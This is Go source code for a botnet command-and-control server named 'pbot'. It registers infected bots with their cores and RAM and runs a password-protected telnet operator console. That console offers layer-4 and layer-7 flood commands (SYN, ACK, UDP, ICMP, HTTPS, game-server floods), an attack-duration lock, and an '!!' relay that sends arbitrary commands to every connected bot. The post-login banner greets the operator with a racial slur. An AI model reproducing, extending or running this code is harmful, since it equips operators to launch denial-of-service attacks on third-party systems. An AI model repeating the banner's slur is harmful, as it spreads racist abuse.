package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	colorReset      = "\033[0m"
	colorPink       = "\033[38;5;211m"
	colorSoftPink   = "\033[38;5;218m"
	colorPastelBlue = "\033[38;5;117m"
	colorPastelPurp = "\033[38;5;147m"
	colorMint       = "\033[38;5;158m"
	colorYellow     = "\033[38;5;229m"
	colorWhite      = "\033[37m"
	colorBold       = "\033[1m"
)

type client struct {
	conn        net.Conn
	group       string
	connectedAt time.Time
	cores       int
	ram         int64
}

var (
	clients        = make(map[net.Conn]*client)
	clientsMu      sync.Mutex
	lastBotCounts  = make(map[string]int)
	countsMu       sync.Mutex
	ongoingAttacks = 0

	attackEndTime time.Time
	attackMutex   sync.Mutex
)

func main() {
	listener, err := net.Listen("tcp", ":6703")
	if err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
	defer listener.Close()

	fmt.Println("[server.go] bot listener started")
	fmt.Println("[server.go] telnet listener started on port: 2323")

	go handleCommands()

	go startTelnetServer()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}

		go handleClient(conn)
	}
}

func handleClient(conn net.Conn) {
	reader := bufio.NewReader(conn)
	line, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}
	line = strings.TrimSpace(line)
	parts := strings.Split(line, "|")
	if len(parts) < 3 {
		conn.Close()
		return
	}
	groupName := parts[0]
	if groupName == "" {
		groupName = "unknown"
	}

	cores, _ := strconv.Atoi(parts[1])
	ram, _ := strconv.ParseInt(parts[2], 10, 64)

	clientsMu.Lock()
	clients[conn] = &client{
		conn:        conn,
		group:       groupName,
		connectedAt: time.Now(),
		cores:       cores,
		ram:         ram,
	}
	total := len(clients)
	clientsMu.Unlock()

	runtimes := map[string]string{
		"amd64":    "x86_64",
		"386":      "x86",
		"arm":      "ARM",
		"arm64":    "AArch64",
		"mips":     "MIPS",
		"mipsle":   "MIPS (LE)",
		"mips64":   "MIPS64",
		"mips64le": "MIPS64 (LE)",
		"ppc64":    "PowerPC 64",
		"ppc64le":  "PowerPC 64 (LE)",
		"riscv64":  "RISC-V 64",
		"s390x":    "IBM Z",
	}

	fmt.Printf("[server.go] New client connected from %s (Group: %s) (Total: %d), (Arch: %s)\r\n", conn.RemoteAddr(), groupName, total, runtimes[runtime.GOARCH])

	defer func() {
		clientsMu.Lock()
		delete(clients, conn)
		clientsMu.Unlock()
		conn.Close()
		fmt.Printf("\n[server.go] Client from %s disconnected. (Total: %d)", conn.RemoteAddr(), len(clients))
	}()

	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		fmt.Printf("\n")
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Error reading from %s: %v", conn.RemoteAddr(), err)
	}
}

func handleCommands() {
	reader := bufio.NewReader(os.Stdin)
	for {
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "exit" {
			fmt.Println("Shutting down server.")
			os.Exit(0)
		}

		if cmd == "" {
			continue
		}

		if cmd == "!bots" {
			printBotsStatus(os.Stdout)
			continue
		}

		if cmd == "!reboot" {
			fmt.Println("Rebooting all bots.")
			handleBroadcastReboot()
			continue
		}

		if cmd == "!getinfo" {

		}

		if cmd == "!stats" {
			printStats(os.Stdout)
			continue
		}

		if strings.HasPrefix(cmd, "!getinfo ") {
			parts := strings.Fields(cmd)
			if len(parts) >= 2 {
				printGroupInfo(os.Stdout, parts[1])
			}
			continue
		}

		broadcastCommand(cmd)
	}
}

func broadcastCommand(cmd string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	if len(clients) == 0 {
		fmt.Println("No clients connected.")
		return
	}

	fmt.Printf("[server.go] broadcasting attack to %d clients", len(clients))
	for addr, c := range clients {
		_, err := c.conn.Write([]byte(cmd + "\n"))
		if err != nil {
			log.Printf("Failed to send command to %s: %v", addr.RemoteAddr(), err)
			c.conn.Close()
			delete(clients, addr)
		}
	}
}

func printBotsStatus(writer io.Writer) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	countsMu.Lock()
	defer countsMu.Unlock()

	currentCounts := make(map[string]int)
	for _, c := range clients {
		currentCounts[c.group]++
	}

	allGroups := make(map[string]bool)
	maxLen := 0
	for g := range currentCounts {
		allGroups[g] = true
		if len(g) > maxLen {
			maxLen = len(g)
		}
	}
	for g := range lastBotCounts {
		allGroups[g] = true
		if len(g) > maxLen {
			maxLen = len(g)
		}
	}

	if len(allGroups) == 0 {
		writer.Write([]byte("No bots connected.\r\n"))
		lastBotCounts = make(map[string]int)
		return
	}

	for group := range allGroups {
		curr := currentCounts[group]
		last := lastBotCounts[group]
		diff := curr - last

		if curr == 0 {
			delete(lastBotCounts, group)
		} else {
			lastBotCounts[group] = curr
		}

		msg := fmt.Sprintf("%s: %d", group, curr)

		if diff > 0 {
			msg += fmt.Sprintf(" %s(+%d)%s", colorMint, diff, colorReset)
		} else if diff < 0 {
			msg += fmt.Sprintf(" %s(%d)%s", colorPink, diff, colorReset)
		}

		writer.Write([]byte(msg + "\r\n"))
	}
}

func handleBroadcastReboot() {
	broadcastCommand("reboot")
	fmt.Println("REBOOTED")
}

func printStats(writer io.Writer) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	var totalCores int
	var totalRAM int64

	for _, c := range clients {
		totalCores += c.cores
		totalRAM += c.ram
	}

	ramGB := float64(totalRAM) / (1024 * 1024 * 1024)

	msg := fmt.Sprintf("\r\n%s---- network stats ----%s\r\n", colorPink, colorReset)
	msg += fmt.Sprintf("  %sbots:  %s%d\r\n", colorPastelBlue, colorReset, len(clients))
	msg += fmt.Sprintf("  %scores: %s%d\r\n", colorPastelBlue, colorReset, totalCores)
	msg += fmt.Sprintf("  %sram:   %s%.2f GB\r\n", colorPastelBlue, colorReset, ramGB)
	msg += fmt.Sprintf("%s-----------------------%s\r\n", colorPink, colorReset)

	writer.Write([]byte(msg))
}

func printGroupInfo(writer io.Writer, groupName string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	found := false
	msg := fmt.Sprintf("\r\n%s---- bots in group: %s ----%s\r\n", colorPink, groupName, colorReset)
	msg += fmt.Sprintf("%-20s | %-6s | %-10s | %-10s\r\n", "address", "cores", "ram", "uptime")
	msg += fmt.Sprintf("%s%s%s\r\n", colorPastelBlue, strings.Repeat("-", 55), colorReset)

	for _, c := range clients {
		if c.group == groupName {
			found = true
			ramGB := float64(c.ram) / (1024 * 1024 * 1024)
			uptime := time.Since(c.connectedAt).Round(time.Second).String()
			msg += fmt.Sprintf("%s%-20s%s | %-6d | %-10.2f GB | %-10s\r\n", colorMint, c.conn.RemoteAddr().String(), colorReset, c.cores, ramGB, uptime)
		}
	}

	if !found {
		msg = fmt.Sprintf("\r\nNo bots found in group: %s\r\n", groupName)
	} else {
		msg += fmt.Sprintf("%s%s%s\r\n", colorPastelBlue, strings.Repeat("-", 55), colorReset)
	}

	writer.Write([]byte(msg))
}

func killBot(writer io.Writer, groupName string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	found := false
	for _, c := range clients {
		if c.group == groupName {
			found = true
			c.conn.Close()
		}
	}

	if !found {
		writer.Write([]byte(fmt.Sprintf("\r\nNo bots found in group: %s\r\n", groupName)))
		return
	}

	writer.Write([]byte(fmt.Sprintf("\r\nSuccessfully killed all bots in group: %s\r\n", groupName)))
}

func startTelnetServer() {
	listener, err := net.Listen("tcp", ":2323")
	if err != nil {
		log.Fatalf("[server.go] failed to start telnet server: %v", err)
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting telnet connection: %v", err)
			continue
		}

		fmt.Printf("[server.go] new telnet connection from %s\n", conn.RemoteAddr())
		go handleTelnetClient(conn)
	}
}

func cleanTelnet(data []byte) string {
	var sb strings.Builder
	i := 0
	for i < len(data) {
		b := data[i]
		if b == 255 {
			if i+1 >= len(data) {
				break
			}
			cmd := data[i+1]
			if cmd >= 251 && cmd <= 254 {
				i += 3
			} else {
				i += 2
			}
			continue
		}

		if b >= 33 && b <= 126 {
			sb.WriteRune(rune(b))
		}
		i++
	}
	return sb.String()
}

func restartTelnet(conn net.Conn) {
	fmt.Println("[server.go] restarting telnet server, crash detected")
	conn.Close()
	go startTelnetServer()
}

func loadCredentials() (map[string]string, error) {
	creds := make(map[string]string)
	file, err := os.Open("login.txt")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			creds[parts[0]] = parts[1]
		}
	}
	return creds, scanner.Err()
}

func handleTelnetClient(conn net.Conn) {
	defer func() {
		conn.Close()
		fmt.Printf("\n[server.go] telnet client: %s disconnected\n", conn.RemoteAddr())
	}()

	creds, err := loadCredentials()
	if err != nil {
		log.Printf("Failed to load credentials: %v", err)
		conn.Write([]byte("Error: Authentication system unavailable.\r\n"))
		return
	}

	conn.Write([]byte(fmt.Sprintf("\033]0;welcome to pbot. please log in\007")))
	conn.Write([]byte("\x1b[39m\033[38;5;217m╔══ \033[0m\033[1;37m[\033[38;5;217mUsername\033[1;37m]\r\n"))
	conn.Write([]byte("\x1b[39m\033[38;5;217m╚═>\033[0m\033[1;37m "))

	scanner := bufio.NewScanner(conn)
	if !scanner.Scan() {
		return
	}
	username := cleanTelnet(scanner.Bytes())

	conn.Write([]byte("\x1b[39m\033[38;5;217m╔══ \033[0m\033[1;37m[\033[38;5;217mPassword\033[1;37m]\r\n"))
	conn.Write([]byte("\x1b[39m\033[38;5;217m╚═>\033[0m\033[1;37m "))

	if !scanner.Scan() {
		return
	}
	password := cleanTelnet(scanner.Bytes())

	validPass, exists := creds[username]
	if !exists {
		log.Printf("[server.go] user '%s' not found. (RawLen: %d)", username, len(scanner.Bytes()))
		conn.Write([]byte("Access Denied.\r\n"))
		return
	}
	if validPass != password {
		log.Printf("[server.go] user '%s' incorrect password.", username)
		accessDenied := fmt.Sprintf("\r\n%sAccess Denied.\r\n%s", colorPink, colorReset)
		conn.Write([]byte(accessDenied))
		time.Sleep(time.Second * 2)
		return
	}

	log.Printf("\n[server.go] user '%s' logged in from %s", username, conn.RemoteAddr())

	conn.Write([]byte("\033[2J\033[H"))
	conn.Write([]byte("Well, well, well... It seems a nigger has appeared here...\r\n"))
	time.Sleep(time.Second * 2)
	conn.Write([]byte("\033[2J\033[H"))
	conn.Write([]byte("Launching pbot...\r\n"))
	time.Sleep(time.Second * 5)
	conn.Write([]byte("\033[2J\033[H"))
	conn.Write([]byte(fmt.Sprintf("%sWelcome to pbot, %s%s\r\n", colorWhite, username, colorReset)))

	for {
		clientsMu.Lock()
		botCount := len(clients)
		clientsMu.Unlock()
		conn.Write([]byte(fmt.Sprintf("\033]0;Connected: %d\007", botCount)))

		prompt := fmt.Sprintf("\r\n%sroot@botnet%s: %s~# %s", colorPink, colorPastelPurp, colorPastelBlue, colorReset)
		conn.Write([]byte(prompt))

		if !scanner.Scan() {
			break
		}

		cmd := strings.TrimSpace(scanner.Text())

		if cmd == "exit" {
			conn.Write([]byte("Goodbye\r\n"))
			break
		}

		if cmd == "" {
			continue
		}

		if cmd == "clear" {
			conn.Write([]byte("\033[2J\033[H"))
			continue
		}

		if cmd == "?" {
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("  " + colorPink + "layer4" + colorReset + "\r\n"))
			conn.Write([]byte("   !syn        <target> <time> dport=<port> ...\r\n"))
			conn.Write([]byte("   !ack        <target> <time> dport=<port> ...\r\n"))
			conn.Write([]byte("   !icmp       <target> <time> ...\r\n"))
			conn.Write([]byte("   !udp        <target> <time> dport=<port> len=<len> ...\r\n"))
			conn.Write([]byte("   !udpplain   <target> <time> dport=<port> len=<len> ...\r\n"))
			conn.Write([]byte("   !fivem      <target> <time> dport=<port> ...\r\n"))
			conn.Write([]byte("   !fortnite   <target> <time> dport=<port> ...\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("  " + colorPastelBlue + "layer7" + colorReset + "\r\n"))
			conn.Write([]byte("   !https2     <url> <time> <threads> ...\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("  " + colorPastelPurp + "manager" + colorReset + "\r\n"))
			conn.Write([]byte("   !bots       List connected bots\r\n"))
			conn.Write([]byte("   !stats      Show global network stats\r\n"))
			conn.Write([]byte("   !getinfo    <group> List details for a bot group\r\n"))
			conn.Write([]byte("   !stop       Stop all attacks\r\n"))
			conn.Write([]byte("   !kill       Kill all bot connections\r\n"))
			conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "!bots" {
			conn.Write([]byte("\n"))
			printBotsStatus(conn)
			continue
		}
		if cmd == "!stats" {
			conn.Write([]byte("\n"))
			printStats(conn)
			continue
		}

		if strings.HasPrefix(cmd, "!getinfo ") {
			parts := strings.Fields(cmd)
			if len(parts) >= 2 {
				printGroupInfo(conn, parts[1])
			} else {
				conn.Write([]byte("\r\nUsage: !getinfo <group>\r\n"))
			}
			continue
		}
		if strings.HasPrefix(cmd, "!!") {
			actualCmd := strings.TrimPrefix(cmd, "!!")

			clientsMu.Lock()
			botCount := len(clients)
			clientsMu.Unlock()

			if botCount == 0 {
				conn.Write([]byte("No bots connected"))
				continue
			}

			response := fmt.Sprintf("%sBroadcasted command to %d bots.%s\r\n", colorMint, botCount, colorReset)
			conn.Write([]byte(response))

			broadcastCommand(actualCmd)
			continue
		}

		if strings.HasPrefix(cmd, "!") {
			parts := strings.Fields(cmd)
			if len(parts) == 0 {
				continue
			}

			if parts[0] == "!stop" {
				attackMutex.Lock()
				attackEndTime = time.Time{}
				attackMutex.Unlock()

				conn.Write([]byte(fmt.Sprintf("%sSuccessfully stopped all attacks.%s\r", colorPink, colorReset)))
				broadcastCommand(cmd)
				continue
			}

			validCommands := map[string]bool{
				"!udp": true, "!udpplain": true, "!syn": true,
				"!https2": true, "!tcplegit": true, "!fivem": true,
				"!icmp": true, "!ack": true, "!fortnite": true,
				"!bots": true, "!stop": true, "!reboot": true, "!stats": true, "!getinfo": true, "!kill": true,
			}

			if !validCommands[parts[0]] {
				conn.Write([]byte(fmt.Sprintf("%sUnknown command.%s\r", colorPink, colorReset)))
				continue
			}

			if validCommands[parts[0]] {
				if parts[0] != "!reboot" && parts[0] != "!stop" && parts[0] != "!bots" && parts[0] != "!stats" && parts[0] != "!getinfo" && parts[0] != "!kill" {
					if len(parts) < 2 {
						conn.Write([]byte(fmt.Sprintf("%sInvalid arguments.%s\r", colorPink, colorReset)))
						continue
					}
				}
			}

			attackMutex.Lock()
			if time.Now().Before(attackEndTime) {
				remaining := time.Until(attackEndTime).Seconds()
				attackMutex.Unlock()
				conn.Write([]byte(fmt.Sprintf("%sAttack already in progress. Try again in %.0fs!%s\r", colorPink, remaining, colorReset)))
				continue
			}
			attackMutex.Unlock()

			durationIdx := 2

			if durationIdx != -1 && len(parts) > durationIdx {
				dur, err := strconv.Atoi(parts[durationIdx])
				if err == nil && dur > 0 {
					attackMutex.Lock()
					attackEndTime = time.Now().Add(time.Duration(dur) * time.Second)
					attackMutex.Unlock()
				}
			}

			clientsMu.Lock()
			botCount := len(clients)
			clientsMu.Unlock()

			if botCount == 0 {
				conn.Write([]byte("No bots connected.\r\n"))
				continue
			}

			response := fmt.Sprintf("%sBroadcasted command to %d bots!%s\r", colorMint, botCount, colorReset)
			conn.Write([]byte(response))
			ongoingAttacks++
			broadcastCommand(cmd)
			continue
		}

		conn.Write([]byte("\n"))
	}

	if err := scanner.Err(); err != nil {
		log.Printf("couldnt read telnet client %s: %v", conn.RemoteAddr(), err)
	}
}
